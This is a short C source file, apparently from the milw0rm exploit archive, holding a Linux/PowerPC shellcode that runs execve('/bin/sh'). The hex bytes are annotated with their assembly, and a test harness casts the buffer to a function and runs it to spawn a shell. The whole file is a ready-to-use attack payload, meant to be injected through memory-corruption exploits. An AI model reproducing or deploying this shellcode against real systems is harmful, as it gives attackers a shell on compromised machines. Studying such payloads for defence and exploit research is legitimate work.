/* execve-core.c by Charles Stevenson <core@bokeoa.com> */
char hellcode[] = /* execve /bin/sh linux/ppc by core */
// Sometimes you can comment out the next line if space is needed
"\x7c\x3f\x0b\x78"	/*mr	r31,r1*/
"\x7c\xa5\x2a\x79"	/*xor.	r5,r5,r5*/
"\x42\x40\xff\xf9"	/*bdzl+	10000454<main>*/
"\x7f\x08\x02\xa6"	/*mflr	r24*/
"\x3b\x18\x01\x34"	/*addi	r24,r24,308*/
"\x98\xb8\xfe\xfb"	/*stb	r5,-261(r24)*/
"\x38\x78\xfe\xf4"	/*addi	r3,r24,-268*/
"\x90\x61\xff\xf8"	/*stw	r3,-8(r1)*/
"\x38\x81\xff\xf8"	/*addi	r4,r1,-8*/
"\x90\xa1\xff\xfc"	/*stw	r5,-4(r1)*/
"\x3b\xc0\x01\x60"	/*li	r30,352*/
"\x7f\xc0\x2e\x70"	/*srawi	r0,r30,5*/
"\x44\xde\xad\xf2"	/*.long	0x44deadf2*/
"/bin/shZ"; // the last byte becomes NULL

int main(void)
{
  void (*shell)() = (void *)&hellcode;
  printf("%d byte execve /bin/sh shellcode for linux/ppc by core\n",
         strlen(hellcode));
  shell();
  return 0;
}

// milw0rm.com [2005-11-09]